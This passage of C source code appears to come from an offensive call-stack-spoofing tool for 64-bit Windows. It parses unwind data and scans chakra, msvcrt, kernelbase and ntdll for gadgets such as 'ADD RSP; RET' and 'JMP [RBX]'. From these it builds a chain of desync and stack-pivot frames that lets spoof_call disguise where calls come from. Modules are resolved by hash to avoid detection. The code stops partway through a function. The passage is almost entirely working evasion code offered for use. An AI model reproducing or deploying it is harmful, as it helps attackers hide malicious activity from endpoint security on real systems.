        status = GetStackFrameSizeWhereRbpIsPushedOnStack(moduleBase, (PVOID)unwindInfo, stackSize);

        if (0 != status) {            
            suitableFrames++;
            if (*skip >= suitableFrames) {
                // Let's try another frame
                continue;
            }
            *skip = suitableFrames;
            printf("Breaking at: %d\n", i);
            *prtSaveIndex = i;
            break;
        }
    }

    *rtTargetOffset = (DWORD64)((UINT64)moduleBase + (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);
    sConfig->SecondFrameFunctionPointer = (PVOID)*rtTargetOffset;
    sConfig->SecondFrameSize = *stackSize;
    sConfig->StackOffsetWhereRbpIsPushed = status;

    printf("Second Frame FP: 0x%I64X\n", *rtTargetOffset);
    printf("Second Frame stack size: 0x%lx\n", *stackSize);

    printf("Return address: 0x%I64X\n", (ULONGLONG)(moduleBase + *stackSize));


    return status;
}


VOID FindGadget(HMODULE moduleBase, PERF pRuntimeFunctionTable, DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex, PDWORD skip, DWORD gadgetType) {
    DWORD           gadgets = 0;
    DWORD           status;
    PUNWIND_INFO    unwindInfo;
    DWORD           addRspGadget = ADD_RSP_0x38;

    if (sConfig->Nargs > 8) {
        addRspGadget = ADD_RSP_0x80;
    }

    addRspGadget += (DWORD)((0x08 * sConfig->Nargs) << 24);

    printf("ADD RSP Gadget: 0x%x\n", (addRspGadget & 0x00FFFFFF));
    
    for (DWORD i = 0; i < rtLastIndex; i++)
    {
        BOOL gadgetFound = FALSE;
        for (UINT64 j = (UINT64)moduleBase + pRuntimeFunctionTable[i].BeginAddress; j < (UINT64)moduleBase + pRuntimeFunctionTable[i].EndAddress; j++) {
            
            if (
                (
                    (
                        (*(DWORD*)j == addRspGadget && *(BYTE*)(j + 4) == RET && sConfig->Nargs <= 8)
                        || 
                        ((*(DWORD*)j & 0x00FFFFFF) == (addRspGadget & 0x00FFFFFF) && *(DWORD*)(j + 2) >= (0x08 * sConfig->Nargs) && *(BYTE*)(j + 7) == RET && sConfig->Nargs > 8)
                    ) && gadgetType == 1
                ) || (
                    *(WORD*)j == JMP_PTR_RBX && (gadgetType == 0 || gadgetType == 3))
                || (
                    (*(WORD*)j == PUSH_RBX || *(WORD*)j == JMP_RBX) && gadgetType == 2)
                ) {

                *stackSize = 0;
                unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
                status = GetStackFrameSizeIgnoringUwopSetFpreg(moduleBase, (PVOID)unwindInfo, stackSize);

                if (status != 0) {
                    gadgets++;
                    if (*skip >= gadgets) {
                        // Let's try another gadget
                        continue;
                    }
                    *skip = gadgets;

                    if (gadgetType == 1){
                        sConfig->AddRspXGadget = (PVOID)j;
                        sConfig->AddRspXGadgetFrameSize = *stackSize;
                        gadgetFound = TRUE;
                        *prtSaveIndex = i;
                        printf("Breaking at: %d         \n", i);
                        printf("Gadget Address: 0x%I64X  \n", j);
                        printf("ADD RSP, X ; RET - Frame Stack size: 0x%lx \n", *stackSize);
                    }
                    else if (gadgetType == 2){
                        sConfig->JmpRbxGadget = (PVOID)j;
                        sConfig->JmpRbxGadgetFrameSize = *stackSize;
                        gadgetFound = TRUE;
                        *prtSaveIndex = i;
                        printf("Breaking at: %d         \n", i);
                        printf("Gadget Address: 0x%I64X  \n", j);
                        printf("PUSH RBX ; RET - Frame Stack size: 0x%lx \n", *stackSize);
                    }
                    else if (gadgetType == 3) {
                        sConfig->JmpRbxGadget = (PVOID)j;
                        sConfig->JmpRbxGadgetFrameSize = *stackSize;
                        gadgetFound = TRUE;
                        *prtSaveIndex = i;
                        printf("Breaking at: %d\n", i);
                        printf("Gadget Address: 0x%I64X\n", j);
                        printf("JMP [RBX] Frame Stack size: 0x%lx\n", *stackSize);
                    }
                    else {
                        if ((*(BYTE*)(j - 0x7) == 0xe8 && *(BYTE*)(j - 0x2) == 0xd8)) {
                            sConfig->JmpRbxGadget = (PVOID)j;
                            sConfig->JmpRbxGadgetFrameSize = *stackSize;
                            gadgetFound = TRUE;
                            *prtSaveIndex = i;
                            printf("Breaking at: %d\n", i);
                            printf("Gadget Address: 0x%I64X\n", j);
                            printf("JMP [RBX] Frame Stack size: 0x%lx\n", *stackSize);
                        }
                        else {
                            continue;
                        }
                    }
                    break;
                }
            }
        }
        if (gadgetFound) {
            break;
        }
    }
}


BOOL CheckForGadget(HMODULE moduleBase, PERF pRuntimeFunction, PDWORD stackSize, PDWORD skip, DWORD gadgetType) {
    DWORD           gadgets = 0;
    DWORD           status;
    PUNWIND_INFO    unwindInfo;
    BOOL gadgetFound = FALSE;
    DWORD callOffset = 1;

    for (UINT64 j = (UINT64)moduleBase + pRuntimeFunction->BeginAddress + 7; j < (UINT64)moduleBase + pRuntimeFunction->EndAddress - 8; j++) {
        //printf("0x%I64x - 0x%I64x\n", (UINT64)moduleBase, j);

        if (
            (
                (
                    ((*(DWORD*)j & 0x00FFFFFF) == (ADD_RSP_0x38 & 0x00FFFFFF) && *(BYTE*)(j + 4) == RET)
                    ||
                    ((*(DWORD*)j & 0x00FFFFFF) == (ADD_RSP_0x80 & 0x00FFFFFF) && *(BYTE*)(j + 7) == RET)
                    ) && gadgetType == 1
                ) || (
                    (
                    *(WORD*)j == JMP_PTR_RBX ||
                    *(WORD*)j == JMP_RDI ||
                    *(WORD*)j == JMP_RSI ||
                    *(DWORD*)j == JMP_R12 ||
                    *(DWORD*)j == JMP_R13 ||
                    ((*(DWORD*)j) & 0x00ffffff) == JMP_RBP ||
                    ((*(DWORD*)j) & 0x00ffffff) == JMP_R14 ||
                    ((* (DWORD*)j) & 0x00ffffff) == JMP_R15
                        ) && gadgetType == 0
                    )
            ) {

            /*
            // But if it's not after a call... well we can't take it
            if (!(*(BYTE*)(j-5) == CALL_NEAR || *(WORD*)(j - 6) == CALL_NEAR_QPTR || (*(DWORD*)(j - 7) & 0x00ffffff) == CALL_FAR_QPTR)
                &&
                !(*(BYTE*)(j - 7) == CALL_NEAR || *(WORD*)(j - 8) == CALL_NEAR_QPTR || (*(DWORD*)(j - 9) & 0x00ffffff) == CALL_FAR_QPTR)
                &&
                !(*(BYTE*)(j - 9) == CALL_NEAR || *(WORD*)(j - 10) == CALL_NEAR_QPTR || (*(DWORD*)(j - 11) & 0x00ffffff) == CALL_FAR_QPTR)
                && gadgetType == 1
                ) {
                continue;
            }
            */

            *stackSize = 0;
            unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunction->UnwindData);
            status = GetStackFrameSizeIgnoringUwopSetFpreg(moduleBase, (PVOID)unwindInfo, stackSize);

            if (status != 0) {
                gadgets++;
                if (*skip >= gadgets) {
                    // Let's try another gadget
                    continue;
                }
                *skip = gadgets;

                if (gadgetType == 1) {
                    sConfig->AddRspXGadget = (PVOID)j;
                    sConfig->AddRspXGadgetFrameSize = *stackSize;
                    gadgetFound = TRUE;
                    printf("Gadget Address: 0x%I64X  \n", j);
                    printf("ADD RSP, X Frame Stack size: 0x%lx \n", *stackSize);
                }
                else {
                    sConfig->JmpRbxGadget = (PVOID)j;
                    sConfig->JmpRbxGadgetFrameSize = *stackSize;
                    gadgetFound = TRUE;
                    printf("Gadget Address: 0x%I64X\n", j);
                    printf("JMP [RBX] Frame Stack size: 0x%lx\n", *stackSize);
                }
                break;
            }
        }
    }
    return gadgetFound;
}

VOID FindSuitableChain() {
    DWORD               rtSaveIndex;
    DWORD               stackSize;
    DWORD64             rtTargetOffset;

    DLL                 kernelbase;
    DLL                 kernel32;
    DLL                 ntdll;
    DLL                 mshtml;
    DLL                 root;
    DLL                 current;

    DWORD               skip_jmp_gadget = 0;
    DWORD               skip_stack_pivot_gadget = 0;
    DWORD               skip_prolog_frame = 0;
    DWORD               skip_pop_rsp_frame = 0;
    DWORD               pdwCallOffset = 0;
    UINT64              puCalledFunctionAddress = 0;
    BOOL                found = FALSE;
    DWORD               tSize = 0;

    custom_memset(&kernelbase, 0, sizeof(DLL));
    custom_memset(&kernel32, 0, sizeof(DLL));
    custom_memset(&ntdll, 0, sizeof(DLL));
    custom_memset(&mshtml, 0, sizeof(DLL));

    ntdll.Handle = (HMODULE)GetModule(NTDLL_HASH);
    GetModuleTextSection(&ntdll);
    
    ntdll.ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress(ntdll.Handle));
    ntdll.ExceptionTable = (PERF)(GetExceptionDirectoryAddress(ntdll.Handle, &tSize));
    ntdll.ExceptionTableLastEntryIndex = (DWORD)(tSize / 12);

    kernelbase.Handle = (HMODULE)GetModule(KERNELBASE_HASH);
    GetModuleTextSection(&kernelbase);
    kernelbase.ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress(kernelbase.Handle));
    kernelbase.ExceptionTable = (PERF)(GetExceptionDirectoryAddress(kernelbase.Handle, &tSize));
    kernelbase.ExceptionTableLastEntryIndex = (DWORD)(tSize / 12);

    kernel32.Handle = (HMODULE)GetModule(KERNEL32DLL_HASH);
    GetModuleTextSection(&kernel32);
    kernel32.ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress(kernel32.Handle));
    kernel32.ExceptionTable = (PERF)(GetExceptionDirectoryAddress(kernel32.Handle, &tSize));
    kernel32.ExceptionTableLastEntryIndex = (DWORD)(tSize / 12);

    //root.Handle = LoadLibraryA("Chakra");
    root.Handle = LoadLibraryA("chakra");
    GetModuleTextSection(&root);
    root.ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress(root.Handle));
    root.ExceptionTable = (PERF)(GetExceptionDirectoryAddress(root.Handle, &tSize));
    root.ExceptionTableLastEntryIndex = (DWORD)(tSize / 12);
    
    current.Handle = LoadLibraryA("msvcrt");
    GetModuleTextSection(&current);
    current.ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress(current.Handle));
    current.ExceptionTable = (PERF)(GetExceptionDirectoryAddress(current.Handle, &tSize));
    current.ExceptionTableLastEntryIndex = (DWORD)(tSize / 12);

    rtSaveIndex = -1;

    while(!found) {
        sConfig->FirstFrameFunctionPointer = NULL;
        FindProlog(root.Handle, root.ExceptionTable, root.ExceptionTableLastEntryIndex, &stackSize, &rtSaveIndex, &rtTargetOffset);
        
        if (NULL == sConfig->FirstFrameFunctionPointer) {
            break;
        }
        printf("1. Found UWOP_SET_FPREG frame at frame %u 0x%I64x\n", rtSaveIndex, sConfig->FirstFrameFunctionPointer);
        Sleep(500);

        DWORD skipFirstFrameGadgets = 0;
        PERF currentFirstFrameFunction = root.ExceptionTable + rtSaveIndex;

        while (FindCallOffset(root.Handle, currentFirstFrameFunction, &pdwCallOffset, &puCalledFunctionAddress, &skipFirstFrameGadgets)) {
            // We loop through all the calls in the frame
            sConfig->FirstFrameRandomOffset = pdwCallOffset;
            PERF currentSecondFrameFunction = NULL;
            if (puCalledFunctionAddress == 0 || (puCalledFunctionAddress - (UINT64)root.Handle) <= 0) {
                continue;
            }
            
            currentSecondFrameFunction = RTFindFunctionByAddressInRFTable(root.ExceptionTable, root.ExceptionTableLastEntryIndex, (DWORD64)(puCalledFunctionAddress - (UINT64)root.Handle));
            
            if (NULL == currentSecondFrameFunction) {
                continue;
            }
            
            if (!CheckPushRbp(root.Handle, currentSecondFrameFunction, &stackSize)) {
                continue;
            }
            printf("1. Found UWOP_SET_FPREG frame\n");
            printf("2. Found UWOP_PUSH_NONVOL (RBP) frame %u at 0x%I64x\n", rtSaveIndex, (UINT64)root.Handle + currentSecondFrameFunction->BeginAddress);
            DWORD skipSecondFrameGadgets = 0;
            while (FindCallOffset(root.Handle, currentSecondFrameFunction, &pdwCallOffset, &puCalledFunctionAddress, &skipSecondFrameGadgets)) {
                BOOL checkpoint = FALSE;
                PERF currentDesyncFrameFunction = NULL;
                sConfig->SecondFrameRandomOffset = pdwCallOffset;
                if (puCalledFunctionAddress == 0) {
                    continue;
                }

                checkpoint = SearchFrameWithinModule(root, &currentDesyncFrameFunction, puCalledFunctionAddress, 0);
                if (!checkpoint &&
                    (puCalledFunctionAddress > (UINT64)current.TextSectionAddress) &&
                    (puCalledFunctionAddress < ((UINT64)current.TextSectionAddress + current.TextSectionSize))) {
                    checkpoint = SearchFrameWithinModule(current, &currentDesyncFrameFunction, puCalledFunctionAddress, 0);
                }
                else if (!checkpoint &&
                    (puCalledFunctionAddress > (UINT64)kernelbase.TextSectionAddress) &&
                    (puCalledFunctionAddress < ((UINT64)kernelbase.TextSectionAddress + kernelbase.TextSectionSize))) {
                    checkpoint = SearchFrameWithinModule(kernelbase, &currentDesyncFrameFunction, puCalledFunctionAddress, 0);
                }
                else if (!checkpoint &&
                    (puCalledFunctionAddress > (UINT64)ntdll.TextSectionAddress) &&
                    (puCalledFunctionAddress < ((UINT64)ntdll.TextSectionAddress + ntdll.TextSectionSize))) {
                    checkpoint = SearchFrameWithinModule(ntdll, &currentDesyncFrameFunction, puCalledFunctionAddress, 0);
                }
                
                if (!checkpoint) {
                    continue;
                }
                printf("1. Found UWOP_SET_FPREG frame\n");
                printf("2. Found UWOP_PUSH_NONVOL (RBP) frame\n");
                printf("3. Found Desync Gadget\n");
                DWORD skipDesyncFrameGadgets = 0;
                while (FindCallOffset(current.Handle, currentDesyncFrameFunction, &pdwCallOffset, &puCalledFunctionAddress, &skipDesyncFrameGadgets)) {
                    PERF currentStackPivotFrameFunction = NULL;
                    if (puCalledFunctionAddress == 0) {
                        continue;
                    }
                    if ((puCalledFunctionAddress > (UINT64)root.TextSectionAddress) &&
                        (puCalledFunctionAddress < ((UINT64)root.TextSectionAddress + root.TextSectionSize)))
                    {
                        found = SearchFrameWithinModule(
                            root,
                            &currentStackPivotFrameFunction,
                            puCalledFunctionAddress,
                            1
                        );
                    }
                    else if ((puCalledFunctionAddress > (UINT64)current.TextSectionAddress) &&
                        (puCalledFunctionAddress < ((UINT64)current.TextSectionAddress + current.TextSectionSize)))
                    {
                        found = SearchFrameWithinModule(
                            current,
                            &currentStackPivotFrameFunction,
                            puCalledFunctionAddress,
                            1
                        );
                    }
                    else if ((puCalledFunctionAddress > (UINT64)kernelbase.TextSectionAddress) &&
                        (puCalledFunctionAddress < ((UINT64)kernelbase.TextSectionAddress + kernelbase.TextSectionSize)))
                    {
                        found = SearchFrameWithinModule(
                            kernelbase,
                            &currentStackPivotFrameFunction,
                            puCalledFunctionAddress,
                            1
                        );
                    }
                    else if ((puCalledFunctionAddress > (UINT64)ntdll.TextSectionAddress) &&
                        (puCalledFunctionAddress < ((UINT64)ntdll.TextSectionAddress + ntdll.TextSectionSize)))
                    {
                        found = SearchFrameWithinModule(
                            ntdll,
                            &currentStackPivotFrameFunction,
                            puCalledFunctionAddress,
                            1
                        );
                    }

                    if (!found) {
                        continue;
                    }
                    printf("4. Compliant Stack Pivot Gadget\n");
                    break;
                }            
            }
        }

    }
    if (!found) {
        printf("\n[-] Chain not found... sorry! :(\n");
    }
    else {
        printf("\n[+] Chain found! Oh yeaaaahhh! :)\n");
    }

}

BOOL SearchFrameWithinModule(DLL current, PERF* pCurrentFrameFunction, UINT64 puCalledFunctionAddress, DWORD gadgetType) {
    DWORD skipSecondFrameGadgets = 0;
    DWORD pdwCallOffset = 0;
    DWORD skip = 0;
    DWORD stackSize = 0;

    *pCurrentFrameFunction = RTFindFunctionByAddressInRFTable(current.ExceptionTable, current.ExceptionTableLastEntryIndex, (DWORD64)(puCalledFunctionAddress - (UINT64)current.Handle));
    if (NULL == *pCurrentFrameFunction) {
        return FALSE;
    }

    if (!CheckForGadget(current.Handle, *pCurrentFrameFunction, &stackSize, &skip, gadgetType)) {
        return FALSE;
    }
    return TRUE;
};

BOOL FindCallOffset(HMODULE moduleBase, PERF pRuntimeFunction, PDWORD pdwCallOffset, PUINT64 pCalledFunctionAddress, PDWORD skip) {
    DWORD           gadgets = 0;
    BOOL            status  = FALSE;
    DWORD           callOffset;
    DWORD           staticOffset = 4;
    *pdwCallOffset = 0;
    *pCalledFunctionAddress = 0;

    for (UINT64 j = (UINT64)moduleBase + pRuntimeFunction->BeginAddress; j < (UINT64)moduleBase + pRuntimeFunction->EndAddress; j++) {
        callOffset = 1;
        // OK, found a potential call
        if (*(BYTE*)j == CALL_NEAR || *(WORD*)j == CALL_NEAR_QPTR || (*(DWORD*)j & 0x00ffffff) == CALL_FAR_QPTR) {

            if ((*(DWORD*)j & 0x00ffffff) == CALL_FAR_QPTR) {
                callOffset += 2;
            }
            else if (*(WORD*)j == CALL_NEAR_QPTR) {
                    callOffset++;
            }
           

            // In several DLLs, after a call we have a nop of some type
            // if (!(*(BYTE*)(j + callOffset) == 0x90 || *(WORD*)(j + callOffset) == 0x1f0f || *(WORD*)(j + callOffset) == 0x0f48)) {
            //    continue;
            //}
            gadgets++;
            if (*skip >= gadgets) {
                // Let's try another gadget
                continue;
            }
            *skip = gadgets;
            // Call returning at start of call + length of call instruction
            *pdwCallOffset = (DWORD)((j + staticOffset + callOffset) - (UINT64)moduleBase);
            *pCalledFunctionAddress = (j + callOffset + staticOffset + *(DWORD*)(j+callOffset));
            if (*pCalledFunctionAddress > 0x7fffffffffff) {
                continue;
            }
            /*
            printf("  Function called at: 0x%I64x\n", j);
            printf("  Called function: 0x%I64x\n", *pCalledFunctionAddress);
            Sleep(500);
            */
            status = TRUE;
            break;
        }
    }
    return status;
}

BOOL CheckPushRbp(HMODULE moduleBase, PERF pRuntimeFunction, PDWORD stackSize) {
    PUNWIND_INFO unwindInfo;
    DWORD        pdwCallOffset = 0;
    DWORD        status = 0;
    *stackSize = 0;

    unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunction->UnwindData);
    status = GetStackFrameSizeWhereRbpIsPushedOnStack(moduleBase, (PVOID)unwindInfo, stackSize);
    if (0 != status) {
    
        sConfig->SecondFrameFunctionPointer = (PVOID)((UINT64)moduleBase + (UINT64)pRuntimeFunction->BeginAddress);
        sConfig->SecondFrameSize = *stackSize;
        sConfig->StackOffsetWhereRbpIsPushed = status;
    }
    
    return 0 != status;
}

// Wrapper function: DO NOT USE
VOID SpoofCallStack(PSPOOFER psConfig) {

    // _ReturnAddress intrinsic doesn't work as expected, use _AddressOfReturnAddress instead
    psConfig->ReturnAddress = _AddressOfReturnAddress();
    spoof_call(psConfig);
}

DWORD FindCallInstructionOffset(uint64_t startAddress, DWORD searchLimit) {
    
	DWORD offset = 0;
	DWORD callOffset = 0;
	DWORD staticOffset = 4; // Size of CALL instruction
	BOOL found = FALSE;

	while (offset < searchLimit) {
		if (*(BYTE*)(startAddress + offset) == CALL_NEAR || *(WORD*)(startAddress + offset) == CALL_NEAR_QPTR || (*(DWORD*)(startAddress + offset) & 0x00ffffff) == CALL_FAR_QPTR) {
			if ((*(DWORD*)(startAddress + offset) & 0x00ffffff) == CALL_FAR_QPTR) {
				callOffset += 3;
			}
			else if (*(WORD*)(startAddress + offset) == CALL_NEAR_QPTR) {
				callOffset += 2;
            }
            else {
                callOffset++;
            }
			found = TRUE;
			break;
		}
		offset++;
	}

	if (found) {
		return (offset + staticOffset + callOffset);
	}
	return 0;

}

DWORD GetStackFrameSizeWhereRbpIsPushedOnStack(HMODULE moduleBase, PVOID unwindInfoAddress, DWORD* targetStackOffset) {

    DWORD               saveStackOffset;
    DWORD               backupStackOffset;
    PRUNTIME_FUNCTION   pChainedFunction;

    BOOL                RBP_PUSHED          = FALSE;
    PUNWIND_INFO        unwindInfo          = (PUNWIND_INFO)unwindInfoAddress;
    PUNWIND_CODE        unwindCode          = (PUNWIND_CODE)unwindInfo->UnwindCode;
    MIN_CTX             ctx                 = MIN_CTX();
    DWORD               frameSize           = 0;
    DWORD               nodeIndex           = 0;
    DWORD               countOfCodes        = unwindInfo->CountOfCodes;
    
    saveStackOffset                         = 0;
    *targetStackOffset                      = 0;
    backupStackOffset                       = *targetStackOffset;

    // Initialise context
    custom_memset(&ctx, 0, sizeof(MIN_CTX));
    // printf("The stack is now 0x%I64X\n", *targetOffset); 

    while (nodeIndex < countOfCodes) {
        // Ensure frameSize is reset
        frameSize = 0;

        switch (unwindCode->UnwindOp) {

        case UWOP_PUSH_NONVOL: // 0

            if (unwindCode->OpInfo == RSP) {
                // We break here
                return 0;
            }
            if (unwindCode->OpInfo == RBP && RBP_PUSHED) {
                return 0;
            }
            else if (unwindCode->OpInfo == RBP) {
                saveStackOffset = *targetStackOffset;
                RBP_PUSHED = 1;
            }

            *targetStackOffset += 8;
            break;

        case UWOP_ALLOC_LARGE: // 1
            // If the operation info equals 0 -> allocation size / 8 in next slot
            // If the operation info equals 1 -> unscaled allocation size in next 2 slots
            // In any case, we need to advance 1 slot and record the size

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            DPRINTUNWINDCODE(unwindCode);

            // Keep track of current node
            nodeIndex++;
            // Register size in next slot
            frameSize = unwindCode->FrameOffset;

            if (unwindCode->OpInfo == 0) {
                // If the operation info equals 0, then the size of the allocation divided by 8 
                // is recorded in the next slot, allowing an allocation up to 512K - 8.
                // We already advanced of 1 slot, and recorded the allocation size
                // We just need to multiply it for 8 to get the unscaled allocation size
                frameSize *= 8;
            }
            else
            {
                // If the operation info equals 1, then the unscaled size of the allocation is 
                // recorded in the next two slots in little-endian format, allowing allocations 
                // up to 4GB - 8.
                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                // Keep track of current node
                nodeIndex++;
                // Unmask the rest of the allocation size
                frameSize += unwindCode->FrameOffset << 16;

            }
            DPRINT("Final Frame Size: 0x%x\n", frameSize);
            *targetStackOffset += frameSize;
            break;

        case UWOP_ALLOC_SMALL: // 2

            // Allocate a small-sized area on the stack. The size of the allocation is the operation 
            // info field * 8 + 8, allowing allocations from 8 to 128 bytes.
            *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
            break;


        case UWOP_SET_FPREG: // 3
            return 0;
            break; // EARLY RET

        case UWOP_SAVE_NONVOL: // 4
            // Save a nonvolatile integer register on the stack using a MOV instead of a PUSH. This code is 
            // primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack in a position 
            // that was previously allocated. The operation info is the number of the register. The scaled-by-8 
            // stack offset is recorded in the next unwind operation code slot, as described in the note above.
            if (unwindCode->OpInfo == RSP) {
                // This time, we return only if RSP was saved
                return 0;
            }
            else
            {
                // For future use: save the scaled by 8 stack offset
                *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;
                DPRINTCTX(ctx);

                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                nodeIndex++;

                if (unwindCode->OpInfo != RBP) {
                    // Restore original stack size (!?)
                    *targetStackOffset = backupStackOffset;
                    break;
                }
                if (RBP_PUSHED) {
                    return 0;
                }

                RBP_PUSHED = TRUE;
                // We save the stack offset where MOV [RSP], RBP happened
                // During unwinding, this address will be popped back in RBP
                saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);

                // Restore original stack size (!?)
                *targetStackOffset = backupStackOffset;
            }

            break;
        case UWOP_SAVE_NONVOL_BIG: // 5
            // Save a nonvolatile integer register on the stack with a long offset, using a MOV instead of a PUSH. 
            // This code is primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack 
            // in a position that was previously allocated. The operation info is the number of the register. 
            // The unscaled stack offset is recorded in the next two unwind operation code slots, as described 
            // in the note above.
            if (unwindCode->OpInfo == RSP) {
                return 0;
            }

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
            *((ULONG*)&ctx + unwindCode->OpInfo) += (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;

            if (unwindCode->OpInfo != RBP) {
                // Restore original stack size (!?)
                *targetStackOffset = backupStackOffset;
                break;
            }
            if (RBP_PUSHED) {
                return 0;
            }
            // We save the stack offset where MOV [RSP], RBP happened
            // During unwinding, this address will be popped back in RBP
            saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);
            // Restore Stack Size
            *targetStackOffset = backupStackOffset;

            // Skip the other two nodes used for this unwind operation
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;

            DPRINTCTX(ctx);
            break;

        case UWOP_EPILOG:            // 6
        case UWOP_SAVE_XMM128:       // 8
            // Save all 128 bits of a nonvolatile XMM register on the stack. The operation info is the number of 
            // the register. The scaled-by-16 stack offset is recorded in the next slot.

            // TODO: Handle this

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
            break;
        case UWOP_SPARE_CODE:        // 7
        case UWOP_SAVE_XMM128BIG:    // 9
            // Save all 128 bits of a nonvolatile XMM register on the stack with a long offset. The operation info 
            // is the number of the register. The unscaled stack offset is recorded in the next two slots.

            // TODO: Handle this

            // Advancing next 2 nodes
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;
            break;
        case UWOP_PUSH_MACH_FRAME:    // 10
            // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception. 
            // There are two forms.

            // NOTE: UNTESTED
            // TODO: Test this
            if (unwindCode->OpInfo == 0) {
                *targetStackOffset += 0x40;
            }
            else {
                *targetStackOffset += 0x48;
            }
            break;
        }

        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (BitChainInfo(unwindInfo->Flags))
    {
        nodeIndex = unwindInfo->CountOfCodes;
        if (0 != (nodeIndex & 1))
        {
            nodeIndex += 1;
        }
        pChainedFunction = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
        return GetStackFrameSize(moduleBase, (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pChainedFunction->UnwindData), targetStackOffset);
    }

    return saveStackOffset;


}

DWORD GetStackFrameSizeIgnoringUwopSetFpreg(HMODULE moduleBase, PVOID unwindInfoAddress, DWORD* targetStackOffset) {

    DWORD               saveStackOffset;
    DWORD               backupStackOffset;
    PRUNTIME_FUNCTION   pChainedFunction;

    PUNWIND_INFO        unwindInfo          = (PUNWIND_INFO)unwindInfoAddress;
    PUNWIND_CODE        unwindCode          = (PUNWIND_CODE)unwindInfo->UnwindCode;
    MIN_CTX             ctx                 = MIN_CTX();
    DWORD               frameSize           = 0;
    DWORD               nodeIndex           = 0;
    DWORD               countOfCodes        = unwindInfo->CountOfCodes;

    saveStackOffset                         = 0;
    *targetStackOffset                      = 0;
    backupStackOffset                       = *targetStackOffset;

    // Initialise context
    custom_memset(&ctx, 0, sizeof(MIN_CTX));
    // printf("The stack is now 0x%I64X\n", *targetOffset);

    while (nodeIndex < countOfCodes) {
        // Ensure frameSize is reset
        frameSize = 0;

        switch (unwindCode->UnwindOp) {

        case UWOP_PUSH_NONVOL: // 0

            if (unwindCode->OpInfo == RSP) {
                // We break here
                return 0;
            }
            *targetStackOffset += 8;
            break;

        case UWOP_ALLOC_LARGE: // 1
            // If the operation info equals 0 -> allocation size / 8 in next slot
            // If the operation info equals 1 -> unscaled allocation size in next 2 slots
            // In any case, we need to advance 1 slot and record the size

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            DPRINTUNWINDCODE(unwindCode);

            // Keep track of current node
            nodeIndex++;
            // Register size in next slot
            frameSize = unwindCode->FrameOffset;

            if (unwindCode->OpInfo == 0) {
                // If the operation info equals 0, then the size of the allocation divided by 8 
                // is recorded in the next slot, allowing an allocation up to 512K - 8.
                // We already advanced of 1 slot, and recorded the allocation size
                // We just need to multiply it for 8 to get the unscaled allocation size
                frameSize *= 8;
            }
            else
            {
                // If the operation info equals 1, then the unscaled size of the allocation is 
                // recorded in the next two slots in little-endian format, allowing allocations 
                // up to 4GB - 8.
                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                // Keep track of current node
                nodeIndex++;
                // Unmask the rest of the allocation size
                frameSize += unwindCode->FrameOffset << 16;

            }
            DPRINT("Final Frame Size: 0x%x\n", frameSize);
            *targetStackOffset += frameSize;
            break;

        case UWOP_ALLOC_SMALL: // 2

            // Allocate a small-sized area on the stack. The size of the allocation is the operation 
            // info field * 8 + 8, allowing allocations from 8 to 128 bytes.
            *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
            break;


        case UWOP_SET_FPREG: // 3
            // IGNORED
            break;

        case UWOP_SAVE_NONVOL: // 4
            // Save a nonvolatile integer register on the stack using a MOV instead of a PUSH. This code is 
            // primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack in a position 
            // that was previously allocated. The operation info is the number of the register. The scaled-by-8 
            // stack offset is recorded in the next unwind operation code slot, as described in the note above.
            if (unwindCode->OpInfo == RSP) {
                // This time, we return only if RSP was saved
                return 0;
            }
            else
            {
                // For future use: save the scaled by 8 stack offset
                *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;
                DPRINTCTX(ctx);

                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                nodeIndex++;

                // We save the stack offset where MOV [RSP], RBP happened
                // During unwinding, this address will be popped back in RBP
                saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);

                // Restore original stack size (!?)
                *targetStackOffset = backupStackOffset;
            }

            break;
        case UWOP_SAVE_NONVOL_BIG: // 5
